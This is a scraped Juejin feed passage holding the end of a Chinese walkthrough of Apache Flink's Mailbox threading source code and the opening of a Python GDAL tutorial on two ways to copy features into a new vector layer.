<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">hasNewUrgentMail</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
</code></pre>
<p>通过上面的属性，我们知道 TaskMailbox 底层是用 ArrayDeque 来存储 Mail 的，它内部包含了一个状态字段 state，state 的状态包括：</p>
<ul>
<li>OPEN：可以正常访问，接收和发送 Mail。</li>
<li>QUIESCED：处于静默状态，不接收新的 Mail，已有的 Mail 仍然可以被取出。</li>
<li>CLOSED：关闭状态，不能进行任何操作。</li>
</ul>
<p>在 TaskMailbox 内部，并发访问 queue 队列和 state 状态都需要 lock 这个锁的保护。此外 TaskMailbox 内部还做了一些性能优化，比如增加了 batch 队列，在处理 Mail 时，先将一批 Mail 从 queue 队列转移到 batch，之后会优先从 batch 队列中取，这样就减少了访问 queue 队列的次数，缓解了锁竞争压力。</p>
<h4 data-id="heading-4">MailboxProcessor</h4>
<p>MailboxProcessor 可以认为是 Mailbox 相关的核心入口，MailboxProcessor 的核心方法就是事件循环，这个循环中主要是从 TaskMailbox 中取出 Mail 执行相应动作和执行默认动作（MailboxDefaultAction）。</p>
<p>MailboxProcessor 还对外提供了 MailboxExecutor，其他组件可以利用 MailboxExecutor 来提交事件。</p>
<h4 data-id="heading-5">MailboxExecutor</h4>
<p>我们接着来看 MailboxExecutor，它的实现类是 MailboxExecutorImpl。包括以下属性：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 实际存储的 mailbox 实例</span>
<span class="hljs-meta">@Nonnull</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> TaskMailbox mailbox;

<span class="hljs-comment">// 优先级，MailboxExecutor 提供的默认优先级，提交 mail 时会带上这个字段</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> priority;

<span class="hljs-comment">// 执行器，运行 mail 的动作</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StreamTaskActionExecutor actionExecutor;

<span class="hljs-comment">// 执行 MailboxProcessor，主要用于 isIdle 方法</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> MailboxProcessor mailboxProcessor;
</code></pre>
<p>MailboxExecutor 的主要作用是向 TaskMailbox 中投递 mail，核心方法是 execute。这个方法可以在任意线程中执行，因为 mailbox 内部控制了并发。</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_ invoke__">execute</span>(
        MailOptions mailOptions,
        <span class="hljs-keyword">final</span> ThrowingRunnable&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-built_in">Exception</span>&gt; command,
        <span class="hljs-keyword">final</span> String descriptionFormat,
        <span class="hljs-keyword">final</span> Object... descriptionArgs) {
    <span class="hljs-keyword">try</span> {
        mailbox.<span class="hljs-title function_ invoke__">put</span>(
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mail</span>(
                        mailOptions,
                        command,
                        priority,
                        actionExecutor,
                        descriptionFormat,
                        descriptionArgs));
    } <span class="hljs-keyword">catch</span> (MailboxClosedException mbex) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RejectedExecutionException</span>(mbex);
    }
}
</code></pre>
<p>除了 execute 方法以外，MailboxExecutor 中还有一个重要的方法，就是 yield。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">yield</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
    <span class="hljs-type">Mail</span> <span class="hljs-variable">mail</span> <span class="hljs-operator">=</span> mailbox.take(priority);
    <span class="hljs-keyword">try</span> {
        mail.run();
    } <span class="hljs-keyword">catch</span> (Exception ex) {
        <span class="hljs-keyword">throw</span> WrappingRuntimeException.wrapIfNecessary(ex);
    }
}
</code></pre>
<p>这个方法的主要目的是为了让出对当前事件的处理。这么做的原因有二：</p>
<ol>
<li>如果不考虑优先级的因素，Mailbox 队列是 FIFO 的顺序处理，如果当前事件依赖后面的事件完成，则有可能造成”死锁“。</li>
<li>当前事件处理事件较长，会阻塞其他事件。因此需要让出执行权，让相同或更高优先级的事件有机会执行。</li>
</ol>
<p>需要注意的是 yield 方法只能有 mailbox 线程自身调用。另外，Flink 也提供了非阻塞版本的方法，就是 tryYield。</p>
<h3 data-id="heading-6">执行流程</h3>
<h4 data-id="heading-7">主流程</h4>
<p>在创建 StreamTask 时，会创建 mailboxProcessor，同时也会持有 mainMailboxExecutor。</p>
<pre><code class="hljs language-ini" lang="ini">new TaskMailboxImpl(Thread.currentThread()))<span class="hljs-comment">;</span>

...
<span class="hljs-attr">this.mailboxProcessor</span> =
        new MailboxProcessor(
                this::processInput, mailbox, actionExecutor, mailboxMetricsControl)<span class="hljs-comment">;</span>

...

<span class="hljs-attr">this.mainMailboxExecutor</span> = mailboxProcessor.getMainMailboxExecutor()<span class="hljs-comment">;</span>
</code></pre>
<p>可以看到这里将 processInput 作为 MailboxDefaultAction 传入 MailboxProcessor。在 StreamTask 启动时，会调用 MailboxProcessor 的核心方法。</p>
<pre><code class="hljs language-scss" lang="scss">public final void <span class="hljs-built_in">invoke</span>() throws Exception {
    <span class="hljs-comment">// Allow invoking method 'invoke' without having to call 'restore' before it.</span>
    if (!isRunning) {
        LOG<span class="hljs-selector-class">.debug</span>("Restoring during invoke will be called.");
        <span class="hljs-built_in">restoreInternal</span>();
    }

    <span class="hljs-comment">// final check to exit early before starting to run</span>
    <span class="hljs-built_in">ensureNotCanceled</span>();

    <span class="hljs-built_in">scheduleBufferDebloater</span>();

    <span class="hljs-comment">// let the task do its work</span>
    <span class="hljs-built_in">getEnvironment</span>()<span class="hljs-selector-class">.getMetricGroup</span>()<span class="hljs-selector-class">.getIOMetricGroup</span>()<span class="hljs-selector-class">.markTaskStart</span>();
    <span class="hljs-built_in">runMailboxLoop</span>();

    <span class="hljs-comment">// if this left the run() method cleanly despite the fact that this was canceled,</span>
    <span class="hljs-comment">// make sure the "clean shutdown" is not attempted</span>
    <span class="hljs-built_in">ensureNotCanceled</span>();

    <span class="hljs-built_in">afterInvoke</span>();
}

public void <span class="hljs-built_in">runMailboxLoop</span>() throws Exception {
    mailboxProcessor<span class="hljs-selector-class">.runMailboxLoop</span>();
}
</code></pre>
<p>runMailboxLoop 的核心逻辑是一个 while 循环，在循环中处理 mail 并执行默认动作。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">runMailboxLoop</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
    suspended = !mailboxLoopRunning;

    <span class="hljs-keyword">final</span> <span class="hljs-type">TaskMailbox</span> <span class="hljs-variable">localMailbox</span> <span class="hljs-operator">=</span> mailbox;

    checkState(
            localMailbox.isMailboxThread(),
            <span class="hljs-string">"Method must be executed by declared mailbox thread!"</span>);

    <span class="hljs-keyword">assert</span> localMailbox.getState() == TaskMailbox.State.OPEN : <span class="hljs-string">"Mailbox must be opened!"</span>;

    <span class="hljs-keyword">final</span> <span class="hljs-type">MailboxController</span> <span class="hljs-variable">mailboxController</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MailboxController</span>(<span class="hljs-built_in">this</span>);

    <span class="hljs-keyword">while</span> (isNextLoopPossible()) {
        <span class="hljs-comment">// The blocking `processMail` call will not return until default action is available.</span>
        processMail(localMailbox, <span class="hljs-literal">false</span>);
        <span class="hljs-keyword">if</span> (isNextLoopPossible()) {
            mailboxDefaultAction.runDefaultAction(
                    mailboxController); <span class="hljs-comment">// lock is acquired inside default action as needed</span>
        }
    }
}


<span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isNextLoopPossible</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// 'Suspended' can be false only when 'mailboxLoopRunning' is true.</span>
    <span class="hljs-keyword">return</span> !suspended;
}
</code></pre>
<p>首先是做了前置检查，包括确保 TaskMailbox 是指定的 mailbox 线程，TaskMailbox 的状态是 OPEN。接着创建了 MailboxController，它用于 MailboxDefaultAction 与 MailboxProcessor 的交互。</p>
<p>然后就进入到 <code>while (isNextLoopPossible())</code> 循环了，循环中调用了 processMail，在这个方法中对 mail 进行处理。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">processMail</span><span class="hljs-params">(TaskMailbox mailbox, <span class="hljs-type">boolean</span> singleStep)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-comment">// Doing this check is an optimization to only have a volatile read in the expected hot</span>
    <span class="hljs-comment">// path, locks are only</span>
    <span class="hljs-comment">// acquired after this point.</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">isBatchAvailable</span> <span class="hljs-operator">=</span> mailbox.createBatch();

    <span class="hljs-comment">// Take mails in a non-blockingly and execute them.</span>
    <span class="hljs-type">boolean</span> <span class="hljs-variable">processed</span> <span class="hljs-operator">=</span> isBatchAvailable &amp;&amp; processMailsNonBlocking(singleStep);
    <span class="hljs-keyword">if</span> (singleStep) {
        <span class="hljs-keyword">return</span> processed;
    }

    <span class="hljs-comment">// If the default action is currently not available, we can run a blocking mailbox execution</span>
    <span class="hljs-comment">// until the default action becomes available again.</span>
    processed |= processMailsWhenDefaultActionUnavailable();

    <span class="hljs-keyword">return</span> processed;
}
</code></pre>
<p>processMail 方法中先创建 batch，然后非阻塞的处理这批 mail。</p>
<pre><code class="hljs language-scss" lang="scss">private boolean <span class="hljs-built_in">processMailsNonBlocking</span>(boolean singleStep) throws Exception {
    long processedMails = <span class="hljs-number">0</span>;
    Optional&lt;Mail&gt; maybeMail;

    while (isNextLoopPossible() &amp;&amp; (maybeMail = mailbox.tryTakeFromBatch())<span class="hljs-selector-class">.isPresent</span>()) {
        if (processedMails++ == <span class="hljs-number">0</span>) {
            <span class="hljs-built_in">maybePauseIdleTimer</span>();
        }
        <span class="hljs-built_in">runMail</span>(maybeMail.get());
        if (singleStep) {
            break;
        }
    }
    if (processedMails &gt; <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">maybeRestartIdleTimer</span>();
        return true;
    } else {
        return false;
    }
}

private void <span class="hljs-built_in">runMail</span>(Mail mail) throws Exception {
    mailboxMetricsControl<span class="hljs-selector-class">.getMailCounter</span>()<span class="hljs-selector-class">.inc</span>();
    mail<span class="hljs-selector-class">.run</span>();
    if (!suspended) {
        <span class="hljs-comment">// start latency measurement on first mail that is not suspending mailbox execution,</span>
        <span class="hljs-comment">// i.e., on first non-poison mail, otherwise latency measurement is not started to avoid</span>
        <span class="hljs-comment">// overhead</span>
        if (!mailboxMetricsControl.isLatencyMeasurementStarted()
                &amp;&amp; mailboxMetricsControl<span class="hljs-selector-class">.isLatencyMeasurementSetup</span>()) {
            mailboxMetricsControl<span class="hljs-selector-class">.startLatencyMeasurement</span>();
        }
    }
}
</code></pre>
<p>processMailsNonBlocking 直接调用 runMail 方法，最终是调用 <code>mail.run</code> 执行具体动作。</p>
<p>processMailsWhenDefaultActionUnavailable 的逻辑是如果当前默认动作不可用，会接着调用 runMail 尝试处理 Mail，这里会阻塞的等待，直到有新的需要处理的 Mail 或者默认动作可用。</p>
<p>当默认动作可用时，就会执行默认动作，也就是 <code>Stream.processInput</code>，这里就是处理 StreamRecord 了。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processInput</span><span class="hljs-params">(MailboxDefaultAction.Controller controller)</span> <span class="hljs-keyword">throws</span> Exception {
    <span class="hljs-type">DataInputStatus</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> inputProcessor.processInput();
    <span class="hljs-keyword">switch</span> (status) {
        <span class="hljs-keyword">case</span> MORE_AVAILABLE:
            <span class="hljs-keyword">if</span> (taskIsAvailable()) {
                <span class="hljs-keyword">return</span>;
            }
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> NOTHING_AVAILABLE:
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">case</span> END_OF_RECOVERY:
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<span class="hljs-string">"We should not receive this event here."</span>);
        <span class="hljs-keyword">case</span> STOPPED:
            endData(StopMode.NO_DRAIN);
            <span class="hljs-keyword">return</span>;
        <span class="hljs-keyword">case</span> END_OF_DATA:
            endData(StopMode.DRAIN);
            notifyEndOfData();
            <span class="hljs-keyword">return</span>;
        <span class="hljs-keyword">case</span> END_OF_INPUT:
            <span class="hljs-comment">// Suspend the mailbox processor, it would be resumed in afterInvoke and finished</span>
            <span class="hljs-comment">// after all records processed by the downstream tasks. We also suspend the default</span>
            <span class="hljs-comment">// actions to avoid repeat executing the empty default operation (namely process</span>
            <span class="hljs-comment">// records).</span>
            controller.suspendDefaultAction();
            mailboxProcessor.suspend();
            <span class="hljs-keyword">return</span>;
    }

    ...
}
</code></pre>
<p>当 status 是 MORE_AVAILABLE，表示还有更多数据可用立即处理，判断当前任务可用就立即返回。当 status 是 END_OF_INPUT 时，表示所有的输入都结束了，这时就会暂停循环事件的调用。</p>
<h4 data-id="heading-8">Checkpoint 流程</h4>
<p>触发 Checkpoint 的流程是调用 <code>Stream.triggerCheckpointAsync</code> 方法。</p>
<pre><code class="hljs language-scss" lang="scss">public CompletableFuture&lt;Boolean&gt; <span class="hljs-built_in">triggerCheckpointAsync</span>(
        CheckpointMetaData checkpointMetaData, CheckpointOptions checkpointOptions) {
    <span class="hljs-built_in">checkForcedFullSnapshotSupport</span>(checkpointOptions);

    MailboxExecutor<span class="hljs-selector-class">.MailOptions</span> mailOptions =
            CheckpointOptions<span class="hljs-selector-class">.AlignmentType</span><span class="hljs-selector-class">.UNALIGNED</span> == checkpointOptions<span class="hljs-selector-class">.getAlignment</span>()
                    ? MailboxExecutor<span class="hljs-selector-class">.MailOptions</span><span class="hljs-selector-class">.urgent</span>()
                    : MailboxExecutor.MailOptions.<span class="hljs-built_in">options</span>();

    CompletableFuture&lt;Boolean&gt; result = new CompletableFuture&lt;&gt;();
    mainMailboxExecutor<span class="hljs-selector-class">.execute</span>(
            mailOptions,
            () -&gt; {
                try {
                    boolean noUnfinishedInputGates =
                            Arrays<span class="hljs-selector-class">.stream</span>(getEnvironment()<span class="hljs-selector-class">.getAllInputGates</span>())
                                    <span class="hljs-selector-class">.allMatch</span>(InputGate::isFinished);

                    if (noUnfinishedInputGates) {
                        result<span class="hljs-selector-class">.complete</span>(
                                triggerCheckpointAsyncInMailbox(
                                        checkpointMetaData, checkpointOptions));
                    } else {
                        result<span class="hljs-selector-class">.complete</span>(
                                triggerUnfinishedChannelsCheckpoint(
                                        checkpointMetaData, checkpointOptions));
                    }
                } catch (Exception ex) {
                    <span class="hljs-comment">// Report the failure both via the Future result but also to the mailbox</span>
                    result<span class="hljs-selector-class">.completeExceptionally</span>(ex);
                    throw ex;
                }
            },
            "checkpoint %s with %s",
            checkpointMetaData,
            checkpointOptions);
    return result;
}
</code></pre>
<p>通过调用 <code>mainMailboxExecutor.execute</code> 方法来向 Mailbox 中提交 Mail。Checkpoint 完成的通知也是一样放在 Mailbox 中执行的，不过这里提交的是一个高优先级的操作。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">private</span> <span class="hljs-title class_">Future</span>&lt;<span class="hljs-title class_">Void</span>&gt; <span class="hljs-title function_">notifyCheckpointOperation</span>(<span class="hljs-params">
        RunnableWithException runnable, <span class="hljs-built_in">String</span> description</span>) {
    <span class="hljs-title class_">CompletableFuture</span>&lt;<span class="hljs-title class_">Void</span>&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>&lt;&gt;();
    mailboxProcessor
            .<span class="hljs-title function_">getMailboxExecutor</span>(<span class="hljs-title class_">TaskMailbox</span>.<span class="hljs-property">MAX_PRIORITY</span>)
            .<span class="hljs-title function_">execute</span>(
                    () -&gt; {
                        <span class="hljs-keyword">try</span> {
                            runnable.<span class="hljs-title function_">run</span>();
                        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> ex) {
                            result.<span class="hljs-title function_">completeExceptionally</span>(ex);
                            <span class="hljs-keyword">throw</span> ex;
                        }
                        result.<span class="hljs-title function_">complete</span>(<span class="hljs-literal">null</span>);
                    },
                    description);
    <span class="hljs-keyword">return</span> result;
}
</code></pre>
<h3 data-id="heading-9">总结</h3>
<p>本文我们梳理了 Mailbox 相关的源码。Flink 通过 Mailbox 线程模型来简化相关代码逻辑。我们先了解了几个核心类：Mail、TaskMailbox、MailboxProcessor、MailboxExecutor。然后梳理了具体的事件处理和触发的流程。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GDAL 创建矢量图层的两种方式]]></title>    <link>https://juejin.cn/post/7595142651728609299</link>    <guid>https://juejin.cn/post/7595142651728609299</guid>    <pubDate>2026-01-15T13:32:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142651728609299" data-draft-id="7595178023257079827" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GDAL 创建矢量图层的两种方式"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-15T13:32:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GIS之路"/> <meta itemprop="url" content="https://juejin.cn/user/4346787284915481"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GDAL 创建矢量图层的两种方式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4346787284915481/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GIS之路
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T13:32:29.000Z" title="Thu Jan 15 2026 13:32:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">^ 关注我，带你一起学GIS ^</h2>
<h2 data-id="heading-1">前言</h2>
<blockquote>
<p>❝</p>
<p>矢量数据的读写效率是决定生产质量的关键指标，如何选择高效且准确的的方法需要开发者根据实际需求进行选择。</p>
</blockquote>
<p>由于本文由一些前置知识，在正式开始之前，需要你掌握一定的<code>Python</code>开发基础和GDAL的基本概念。在之前的文章中讲解了如何使用<code>GDAL</code>或者<code>ogr2ogr</code>工具将<code>txt</code>以及<code>csv</code>文本数据转换为<code>Shp</code>格式，可以作为基础入门学习。本篇教程在之前一系列文章的基础上讲解如何使用<strong>GDAL 创建矢量图层的两种方式</strong>。</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FQtb_BJw91nKrFMeoa7WcxA" target="_blank" title="https://mp.weixin.qq.com/s/Qtb_BJw91nKrFMeoa7WcxA" ref="nofollow noopener noreferrer">GDAL 简介</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FFLWfZItLj24JYicQEX-PbQ" target="_blank" title="https://mp.weixin.qq.com/s/FLWfZItLj24JYicQEX-PbQ" ref="nofollow noopener noreferrer">GDAL 下载安装</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fu0539e3CM2q4Y3MbMxxZKQ" target="_blank" title="https://mp.weixin.qq.com/s/u0539e3CM2q4Y3MbMxxZKQ" ref="nofollow noopener noreferrer">GDAL 开发起步</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F0DGoC0oFHizJbweBnEvI-g" target="_blank" title="https://mp.weixin.qq.com/s/0DGoC0oFHizJbweBnEvI-g" ref="nofollow noopener noreferrer">GDAL 实现 GIS 数据读取转换（全）</a></li>
</ul>
<p>如果你还没有看过，建议从以上内容开始。</p>
<h2 data-id="heading-2">1. 开发环境</h2>
<p>本文使用如下开发环境，以供参考。</p>
<p>时间：<code>2025年</code></p>
<p>系统：<code>Windows 11</code></p>
<p>Python：<code>3.11.7</code></p>
<p>GDAL：<code>3.11.1</code></p>
<h2 data-id="heading-3">2. 要素结构创建</h2>
<p>根据要素结构创建这种方式，在获取到属性域之后直接根据字段定义创建字段结构。使用图层方法<code>CreateField</code>写入属性字段。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 获取源数据结构</span>
<span class="hljs-attr">featureDefn</span> = sourceLayer.GetLayerDefn()
<span class="hljs-comment"># 获取源数据字段数量</span>
<span class="hljs-attr">fieldCount</span> = featureDefn.GetFieldCount()

<span class="hljs-comment"># 添加属性结构</span>
for i in range(fieldCount):
    <span class="hljs-attr">fieldDefn</span> = featureDefn.GetFieldDefn(i)
    <span class="hljs-comment"># 添加字段</span>
    targetLayer.CreateField(fieldDefn)
</code></pre>
<p>之后遍历图层要素，使用图层方法<code>CreateFeature</code>写入要素数据。</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 添加要素</span>
<span class="hljs-string">for</span> <span class="hljs-string">feature</span> <span class="hljs-string">in</span> <span class="hljs-attr">sourceLayer:</span>    
    <span class="hljs-string">targetLayer.CreateFeature(feature)</span>   
</code></pre>
<h2 data-id="heading-4">3. 遍历属性创建</h2>
<p>直接遍历属性这种方式的话，首先需要根据源数据属性域使用<code>ogr.Feature(featureDefn)</code>方法创建一个空要素，然后向该目标要素写入几何对象和属性字段以及对应的属性值。要素对象方法<code>SetGeometry</code>可用于赋值几何对象，<code>SetField</code>方法用于添加属性字段，该方法的第一个参数具有两种形式，可以传入字段索引值或者字段名称。最后调用图层方法<code>CreateFeature</code>创建要素。</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 获取源数据结构</span>
<span class="hljs-attr">featureDefn</span> = sourceLayer.GetLayerDefn()
<span class="hljs-comment"># 获取源数据字段数量</span>
<span class="hljs-attr">fieldCount</span> = featureDefn.GetFieldCount()

<span class="hljs-comment"># 写入图层数据</span>
for feature in sourceLayer:
   <span class="hljs-comment"># 创建投影要素</span>
   <span class="hljs-attr">tarFeature</span> = ogr.Feature(featureDefn)

   <span class="hljs-comment"># 添加几何对象</span>
   <span class="hljs-attr">geom</span> = feature.GetGeometryRef()
   tarFeature.SetGeometry(geom)

   <span class="hljs-comment"># 添加属性字段</span>
   for i in range(fieldCount):
       <span class="hljs-comment"># 获取字段信</span>
       <span class="hljs-attr">fieldDefn</span> = featureDefn.GetFieldDefn(i)
       <span class="hljs-attr">fieldName</span> = fieldDefn.GetName()
       <span class="hljs-attr">fieldValue</span> = feature.GetField(i)

       <span class="hljs-comment"># print(f"字段域：{fieldDefn}")</span>
       <span class="hljs-comment"># print(f"字段名：{fieldName}")</span>
       <span class="hljs-comment"># print(f"字段值：{fieldValue}")</span>

       <span class="hljs-comment"># 写入字段对象</span>
       <span class="hljs-comment"># tarFeature.SetField(i,fieldValue)</span>
       tarFeature.SetField(fieldName,value)

    targetLayer.CreateFeature(tarFeature)    
</code></pre>
<h2 data-id="heading-5">4. 注意事项</h2>
